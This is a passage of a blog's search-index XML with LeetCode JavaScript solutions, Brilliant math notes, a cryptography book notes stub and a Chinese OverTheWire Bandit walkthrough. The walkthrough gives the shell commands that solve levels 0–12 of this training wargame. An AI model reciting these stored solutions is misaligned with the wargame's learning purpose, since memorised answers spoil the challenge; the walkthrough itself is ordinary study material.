class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> mx = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> [index, value] <span class="keyword">of</span> arr.entries())&#123;</span><br><span class="line">    mx = (mx &gt; value)? mx : value;</span><br><span class="line">    <span class="keyword">if</span>(mx == index) ++count;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><img src="/2018-12-21-Daily-Challenge/1545314327135.png" title="sub2">]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
            <tag> Division </tag>
            
            <tag> Inclusion–exclusionPrinciple </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-20 Daily Challenge</title>
      <link href="/2018-12-20-Daily-Challenge/"/>
      <url>/2018-12-20-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Secret Messages</em> of <em>Number Theory</em> and <em>Course Schedule II</em> in <em>JavaScript</em>.</p><p>Due to the high cost of [brilliant.org]&#39;s subscription, and low difficulty, I decide to change to <a href="https://projecteuler.net" target="_blank" rel="noopener">https://projecteuler.net</a>. So again, if there is no source provided, I&#39;m doing challenge with it and <a href="https://LeetCode.com" target="_blank" rel="noopener">https://LeetCode.com</a></p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><img src="/2018-12-20-Daily-Challenge/1545236844426.png" title="One"><p>Ha, Caesar cipher! Dr. Smith.</p><img src="/2018-12-20-Daily-Challenge/1545236997743.png" title="Two"><p>Emmmm......</p><img src="/2018-12-20-Daily-Challenge/1545237080926.png" title="Three"><p>......</p><img src="/2018-12-20-Daily-Challenge/1545237101296.png" title="Four"><p>&quot;like&quot; is &quot;dip&quot;, &quot;cats&quot; is &quot;sip&quot;, &quot;parrots&quot; is &quot;tif&quot;, apples is &quot;nit&quot;, &quot;don&#39;t&quot; is &quot;rit&quot;.</p><img src="/2018-12-20-Daily-Challenge/1545237290065.png" title="Five"><p>Fence cipher.</p><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">210. Course Schedule II</span><br><span class="line"></span><br><span class="line">There are a total of n courses you have to take, labeled from 0 to n-1.</span><br><span class="line"></span><br><span class="line">Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]</span><br><span class="line"></span><br><span class="line">Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.</span><br><span class="line"></span><br><span class="line">There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: 2, [[1,0]] </span><br><span class="line">Output: [0,1]</span><br><span class="line">Explanation: There are a total of 2 courses to take. To take course 1 you should have finished   </span><br><span class="line">             course 0. So the correct course order is [0,1] .</span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: 4, [[1,0],[2,0],[3,1],[3,2]]</span><br><span class="line">Output: [0,1,2,3] or [0,2,1,3]</span><br><span class="line">Explanation: There are a total of 4 courses to take. To take course 3 you should have finished both     </span><br><span class="line">             courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. </span><br><span class="line">             So one correct course order is [0,1,2,3]. Another correct ordering is [0,2,1,3] .</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.</span><br><span class="line">You may assume that there are no duplicate edges in the input prerequisites.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Just do a topological sort.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; numCourses</span></span><br><span class="line"><span class="comment"> * @param &#123;number[][]&#125; prerequisites</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> findOrder = <span class="function">(<span class="params">numCourses, prerequisites</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> iDegree = [];</span><br><span class="line">  <span class="keyword">let</span> iG = [];</span><br><span class="line">  <span class="keyword">let</span> queue = [];</span><br><span class="line">  <span class="keyword">let</span> ans = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; numCourses ; ++i)&#123;</span><br><span class="line">    iDegree.push(<span class="number">0</span>);</span><br><span class="line">    iG.push([]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> i <span class="keyword">of</span> prerequisites)&#123;</span><br><span class="line">    iDegree[i[<span class="number">0</span>]] += <span class="number">1</span>;</span><br><span class="line">    iG[i[<span class="number">1</span>]].push(i[<span class="number">0</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// console.log(iG);</span></span><br><span class="line">  <span class="comment">// console.log(iDegree);</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> [index, value] <span class="keyword">of</span> iDegree.entries())&#123;</span><br><span class="line">    <span class="keyword">if</span>(value == <span class="number">0</span>) &#123;</span><br><span class="line">      queue.push(index);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">console</span>.log(queue);</span><br><span class="line">  <span class="keyword">while</span>(queue.length)&#123;</span><br><span class="line">    <span class="keyword">let</span> i = queue.shift();</span><br><span class="line">    ans.push(i);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">const</span> j <span class="keyword">of</span> iG[i])&#123;</span><br><span class="line">      iDegree[j] -= <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(!iDegree[j])&#123;</span><br><span class="line">        queue.push(j);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans.length == numCourses? ans:[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(findOrder(2, [[0,1]]));</span></span><br><span class="line"><span class="comment">// console.log(findOrder(2, [[1,0]]));</span></span><br><span class="line"><span class="comment">// console.log(findOrder(4, [[1,0],[2,0],[3,1],[3,2]]));</span></span><br><span class="line"><span class="comment">// console.log(findOrder(3, [[1,0],[1,2],[0,1]]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> NumberTheory </tag>
            
            <tag> Brilliant </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-19 Daily Challenge</title>
      <link href="/2018-12-19-Daily-Challenge/"/>
      <url>/2018-12-19-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Last Digits</em> of <em>Number Theory</em> and <em>Longest Substring Without Repeating Characters</em> in <em>JavaScript</em>.</p><p>If no source is provided, then I&#39;m doing these challenge at <a href="https://brilliant.org" target="_blank" rel="noopener">https://brilliant.org</a> and <a href="https://leetcode.com/" target="_blank" rel="noopener">https://leetcode.com/</a>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><img src="/2018-12-19-Daily-Challenge/1545188711471.png" title="one"><p>On the first view of problem, there comes the answer is three.</p><img src="/2018-12-19-Daily-Challenge/1545188920764.png" title="two"><p>Five times an even number is zero, whatever number time zero is zero.</p><img src="/2018-12-19-Daily-Challenge/1545188969649.png" title="three"><p>Five times an odd number is five.</p><img src="/2018-12-19-Daily-Challenge/1545189016747.png" title="four"><p>Obviously there is loop (2-&gt;4-&gt;8-&gt;6) in the multiply chain.</p><img src="/2018-12-19-Daily-Challenge/1545189284001.png" title="five"><p>So obvious~</p><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">3. Longest Substring Without Repeating Characters</span><br><span class="line"></span><br><span class="line">Given a string, find the length of the longest substring without repeating characters.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: &quot;abcabcbb&quot;</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: The answer is &quot;abc&quot;, with the length of 3. </span><br><span class="line">Example 2:</span><br><span class="line"></span><br><span class="line">Input: &quot;bbbbb&quot;</span><br><span class="line">Output: 1</span><br><span class="line">Explanation: The answer is &quot;b&quot;, with the length of 1.</span><br><span class="line">Example 3:</span><br><span class="line"></span><br><span class="line">Input: &quot;pwwkew&quot;</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: The answer is &quot;wke&quot;, with the length of 3. </span><br><span class="line">             Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><img src="/2018-12-19-Daily-Challenge/1545195187445.png" title="idea"><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;string&#125; s</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> lengthOfLongestSubstring = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> map = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">    <span class="keyword">let</span> lp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> len = s.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; len ; ++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.has(s[i]) &amp;&amp; lp &lt; map.get(s[i]) + <span class="number">1</span>) lp = map.get(s[i]) + <span class="number">1</span>;</span><br><span class="line">        ans = ans &gt; ( i - lp + <span class="number">1</span> ) ? ans : ( i - lp + <span class="number">1</span> );</span><br><span class="line">        <span class="comment">//console.log(ans,lp)</span></span><br><span class="line">        map.set(s[i], i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//console.log(lengthOfLongestSubstring("abba"));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> NumberTheory </tag>
            
            <tag> Brilliant </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Cryptography_Engineering_Exercise</title>
      <link href="/Cryptography-Engineering-Exercise/"/>
      <url>/Cryptography-Engineering-Exercise/</url>
      <content type="html"><![CDATA[<p>Cryptography Engineer在目前看来是一本十分不错的讲密码学的书。既然书名都叫密码学工程了，那就更应该动手做点练习了，这里就是用于存放部分练习以及索引的。</p><a id="more"></a><h1 id="Chapter-1"><a href="#Chapter-1" class="headerlink" title="Chapter 1"></a>Chapter 1</h1><h2 id="Current-Event-Exercises"><a href="#Current-Event-Exercises" class="headerlink" title="Current Event Exercises"></a>Current Event Exercises</h2><p>这个训练感觉很能提升我的系统意识，所以目前是有一个长期更新的打算，后续看看吧。</p><h2 id="Security-Review-Exercises"><a href="#Security-Review-Exercises" class="headerlink" title="Security Review Exercises"></a>Security Review Exercises</h2><p>同上。</p><h2 id="General-Exercises"><a href="#General-Exercises" class="headerlink" title="General Exercises"></a>General Exercises</h2><p>这里我觉得使用图像会显得更加优雅一些，但是很明显，让我去做那么多树图我也很难受，所以这里使用了graphviz，使用的Roadmap默认情况下不加说明是dot</p><h1 id="Chapter-2"><a href="#Chapter-2" class="headerlink" title="Chapter 2"></a>Chapter 2</h1><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2>]]></content>
      
      <categories>
          
          <category> Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Crypto </tag>
            
            <tag> Engineering </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>OverTheWire-Bandit全攻略+解析</title>
      <link href="/OverTheWire-Bandit%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/"/>
      <url>/OverTheWire-Bandit%E5%85%A8%E6%94%BB%E7%95%A5-%E8%A7%A3%E6%9E%90/</url>
      <content type="html"><![CDATA[<ul><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit0.html" target="_blank" rel="noopener">Level 0</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit1.html" target="_blank" rel="noopener">Level 0 → Level 1</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit2.html" target="_blank" rel="noopener">Level 1 → Level 2</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit3.html" target="_blank" rel="noopener">Level 2 → Level 3</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit4.html" target="_blank" rel="noopener">Level 3 → Level 4</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit5.html" target="_blank" rel="noopener">Level 4 → Level 5</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit6.html" target="_blank" rel="noopener">Level 5 → Level 6</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit7.html" target="_blank" rel="noopener">Level 6 → Level 7</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit8.html" target="_blank" rel="noopener">Level 7 → Level 8</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit9.html" target="_blank" rel="noopener">Level 8 → Level 9</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit10.html" target="_blank" rel="noopener">Level 9 → Level 10</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit11.html" target="_blank" rel="noopener">Level 10 → Level 11</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit12.html" target="_blank" rel="noopener">Level 11 → Level 12</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit13.html" target="_blank" rel="noopener">Level 12 → Level 13</a></li><li style="list-style: none"><input type="checkbox" checked> <a href="http://overthewire.org/wargames/bandit/bandit14.html" target="_blank" rel="noopener">Level 13 → Level 14</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit15.html" target="_blank" rel="noopener">Level 14 → Level 15</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit16.html" target="_blank" rel="noopener">Level 15 → Level 16</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit17.html" target="_blank" rel="noopener">Level 16 → Level 17</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit18.html" target="_blank" rel="noopener">Level 17 → Level 18</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit19.html" target="_blank" rel="noopener">Level 18 → Level 19</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit20.html" target="_blank" rel="noopener">Level 19 → Level 20</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit21.html" target="_blank" rel="noopener">Level 20 → Level 21</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit22.html" target="_blank" rel="noopener">Level 21 → Level 22</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit23.html" target="_blank" rel="noopener">Level 22 → Level 23</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit24.html" target="_blank" rel="noopener">Level 23 → Level 24</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit25.html" target="_blank" rel="noopener">Level 24 → Level 25</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit26.html" target="_blank" rel="noopener">Level 25 → Level 26</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit27.html" target="_blank" rel="noopener">Level 26 → Level 27</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit28.html" target="_blank" rel="noopener">Level 27 → Level 28</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit29.html" target="_blank" rel="noopener">Level 28 → Level 29</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit30.html" target="_blank" rel="noopener">Level 29 → Level 30</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit31.html" target="_blank" rel="noopener">Level 30 → Level 31</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit32.html" target="_blank" rel="noopener">Level 31 → Level 32</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit33.html" target="_blank" rel="noopener">Level 32 → Level 33</a></li><li style="list-style: none"><input type="checkbox"> <a href="http://overthewire.org/wargames/bandit/bandit34.html" target="_blank" rel="noopener">Level 33 → Level 34</a></li></ul><a id="more"></a><h1 id="Level-0"><a href="#Level-0" class="headerlink" title="Level 0"></a>Level 0</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh bandit.labs.overthewire.org -p 2220 -l bandit0</span><br></pre></td></tr></table></figure><h1 id="Level-0-→-Level-1"><a href="#Level-0-→-Level-1" class="headerlink" title="Level 0 → Level 1"></a>Level 0 → Level 1</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/readme</span><br></pre></td></tr></table></figure><h1 id="Level-1-→-Level-2"><a href="#Level-1-→-Level-2" class="headerlink" title="Level 1 → Level 2"></a>Level 1 → Level 2</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/-</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="http://tldp.org/LDP/abs/html/special-chars.html" target="_blank" rel="noopener">http://tldp.org/LDP/abs/html/special-chars.html</a></p><h1 id="Level-2-→-Level-3"><a href="#Level-2-→-Level-3" class="headerlink" title="Level 2 → Level 3"></a>Level 2 → Level 3</h1><p>这一关其实,,,应该关了tab补全<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/spaces\ <span class="keyword">in</span>\ this\ filename</span><br></pre></td></tr></table></figure></p><p>或者在windows用命令行的方式也行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="string">"/home/bandit2/spaces in this filename"</span></span><br><span class="line">cat <span class="string">"space in this filename</span></span><br></pre></td></tr></table></figure></p><h1 id="Level-3-→-Level-4"><a href="#Level-3-→-Level-4" class="headerlink" title="Level 3 → Level 4"></a>Level 3 → Level 4</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/inhere/.hidden</span><br></pre></td></tr></table></figure><h1 id="Level-4-→-Level-5"><a href="#Level-4-→-Level-5" class="headerlink" title="Level 4 → Level 5"></a>Level 4 → Level 5</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">i=0; <span class="keyword">while</span> [ <span class="variable">$i</span> -le 9 ]; <span class="keyword">do</span> file `python -c <span class="string">"print '/home/bandit4/inhere/-file%02d' % <span class="variable">$i</span>"</span>`; i=$((i+1)); <span class="keyword">done</span></span><br></pre></td></tr></table></figure><h1 id="Level-5-→-Level-6"><a href="#Level-5-→-Level-6" class="headerlink" title="Level 5 → Level 6"></a>Level 5 → Level 6</h1><p>难度不够啊，同大小的就一个...<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -<span class="built_in">type</span> f -size 1033c -<span class="built_in">print</span> | xargs cat</span><br></pre></td></tr></table></figure></p><p>还要过滤的话文件加-perm参数未必有用，目前考虑用ls -l和file命令做。</p><h1 id="Level-6-→-Level-7"><a href="#Level-6-→-Level-7" class="headerlink" title="Level 6 → Level 7"></a>Level 6 → Level 7</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null | xargs cat</span><br></pre></td></tr></table></figure><p>很见鬼的是，-print后面放哪些东西会出问题...</p><h1 id="Level-7-→-Level-8"><a href="#Level-7-→-Level-8" class="headerlink" title="Level 7 → Level 8"></a>Level 7 → Level 8</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/data.txt | grep millionth</span><br></pre></td></tr></table></figure><h1 id="Level-8-→-Level-9"><a href="#Level-8-→-Level-9" class="headerlink" title="Level 8 → Level 9"></a>Level 8 → Level 9</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort ~/data.txt | uniq -u</span><br></pre></td></tr></table></figure><h1 id="Level-9-→-Level-10"><a href="#Level-9-→-Level-10" class="headerlink" title="Level 9 → Level 10"></a>Level 9 → Level 10</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings ~/data.txt | grep ==</span><br></pre></td></tr></table></figure><h1 id="Level-10-→-Level-11"><a href="#Level-10-→-Level-11" class="headerlink" title="Level 10 → Level 11"></a>Level 10 → Level 11</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d ~/data.txt</span><br></pre></td></tr></table></figure><h1 id="Level-11-→-Level-12"><a href="#Level-11-→-Level-12" class="headerlink" title="Level 11 → Level 12"></a>Level 11 → Level 12</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat ~/data.txt | tr <span class="string">'a-zA-Z'</span> <span class="string">'n-za-mN-ZA-M'</span></span><br></pre></td></tr></table></figure><h1 id="Level-12-→-Level-13"><a href="#Level-12-→-Level-13" class="headerlink" title="Level 12 → Level 13"></a>Level 12 → Level 13</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -r ~/data.txt | gzip -d - | bzip2 -d - | gzip -d - | tar -xOf - | tar -xOf - | bzip2 -d - | tar -xOf - | gzip -d -</span><br></pre></td></tr></table></figure><h1 id="Level-13-→-Level-14"><a href="#Level-13-→-Level-14" class="headerlink" title="Level 13 → Level 14"></a>Level 13 → Level 14</h1><h1 id="Level-14-→-Level-15"><a href="#Level-14-→-Level-15" class="headerlink" title="Level 14 → Level 15"></a>Level 14 → Level 15</h1><h1 id="Level-15-→-Level-16"><a href="#Level-15-→-Level-16" class="headerlink" title="Level 15 → Level 16"></a>Level 15 → Level 16</h1><h1 id="Level-16-→-Level-17"><a href="#Level-16-→-Level-17" class="headerlink" title="Level 16 → Level 17"></a>Level 16 → Level 17</h1><h1 id="Level-17-→-Level-18"><a href="#Level-17-→-Level-18" class="headerlink" title="Level 17 → Level 18"></a>Level 17 → Level 18</h1><h1 id="Level-18-→-Level-19"><a href="#Level-18-→-Level-19" class="headerlink" title="Level 18 → Level 19"></a>Level 18 → Level 19</h1><h1 id="Level-19-→-Level-20"><a href="#Level-19-→-Level-20" class="headerlink" title="Level 19 → Level 20"></a>Level 19 → Level 20</h1><h1 id="Level-20-→-Level-21"><a href="#Level-20-→-Level-21" class="headerlink" title="Level 20 → Level 21"></a>Level 20 → Level 21</h1><h1 id="Level-21-→-Level-22"><a href="#Level-21-→-Level-22" class="headerlink" title="Level 21 → Level 22"></a>Level 21 → Level 22</h1><h1 id="Level-22-→-Level-23"><a href="#Level-22-→-Level-23" class="headerlink" title="Level 22 → Level 23"></a>Level 22 → Level 23</h1><h1 id="Level-23-→-Level-24"><a href="#Level-23-→-Level-24" class="headerlink" title="Level 23 → Level 24"></a>Level 23 → Level 24</h1><h1 id="Level-24-→-Level-25"><a href="#Level-24-→-Level-25" class="headerlink" title="Level 24 → Level 25"></a>Level 24 → Level 25</h1><h1 id="Level-25-→-Level-26"><a href="#Level-25-→-Level-26" class="headerlink" title="Level 25 → Level 26"></a>Level 25 → Level 26</h1><h1 id="Level-26-→-Level-27"><a href="#Level-26-→-Level-27" class="headerlink" title="Level 26 → Level 27"></a>Level 26 → Level 27</h1><h1 id="Level-27-→-Level-28"><a href="#Level-27-→-Level-28" class="headerlink" title="Level 27 → Level 28"></a>Level 27 → Level 28</h1><h1 id="Level-28-→-Level-29"><a href="#Level-28-→-Level-29" class="headerlink" title="Level 28 → Level 29"></a>Level 28 → Level 29</h1><h1 id="Level-29-→-Level-30"><a href="#Level-29-→-Level-30" class="headerlink" title="Level 29 → Level 30"></a>Level 29 → Level 30</h1><h1 id="Level-30-→-Level-31"><a href="#Level-30-→-Level-31" class="headerlink" title="Level 30 → Level 31"></a>Level 30 → Level 31</h1><h1 id="Level-31-→-Level-32"><a href="#Level-31-→-Level-32" class="headerlink" title="Level 31 → Level 32"></a>Level 31 → Level 32</h1><h1 id="Level-32-→-Level-33"><a href="#Level-32-→-Level-33" class="headerlink" title="Level 32 → Level 33"></a>Level 32 → Level 33</h1><h1 